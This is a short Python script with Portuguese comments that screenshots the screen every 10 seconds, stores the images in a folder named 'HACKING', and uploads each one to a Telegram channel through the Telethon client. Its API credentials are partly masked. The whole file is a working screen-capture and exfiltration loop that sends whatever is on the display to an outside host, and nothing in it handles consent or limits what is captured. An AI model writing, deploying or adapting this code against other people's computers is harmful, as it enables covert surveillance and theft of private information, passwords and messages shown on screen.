import asyncio
from datetime import datetime
from pathlib import Path
import pyautogui
from telethon import TelegramClient

# Suas credenciais fornecidas do telegram ze
api_id = xxxx
api_hash = 'xxxxxxxxxx8b8516b36714cb2'
canal_destino = -100xxxx


pasta_destino = Path('HACKING')
pasta_destino.mkdir(exist_ok=True)

# Inicializar o cliente do Telegram
client = TelegramClient('sessao_meupc', api_id, api_hash)


async def rotina_prints():
  print('🤖 Robô iniciado! Tirando prints a cada 10 segundos...')

  while True:
    try:
      # Gera um nome de arquivo único baseado na data e hora atual
      timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
      caminho_arquivo = pasta_destino / f'print_{timestamp}.png'

      # Tira o print da tela e salva na pasta
      screenshot = pyautogui.screenshot()
      screenshot.save(caminho_arquivo)
      print(f'📸 Print salvo localmente: {caminho_arquivo}')

      # Envia o arquivo para o canal de destino no Telegram
      await client.send_file(
          canal_destino,
          str(caminho_arquivo),
          caption=f'🖥️ Print automático - {timestamp}',
      )
      print('📤 Print enviado para o Telegram com sucesso!\n')

    except Exception as e:
      print(f'❌ Ocorreu um erro durante o processo: {e}\n')

    # Aguarda 10 segundos antes do próximo print
    await asyncio.sleep(10)


def main():
  with client:
    client.loop.run_until_complete(rotina_prints())
#Nexamos

if __name__ == '__main__':
  main()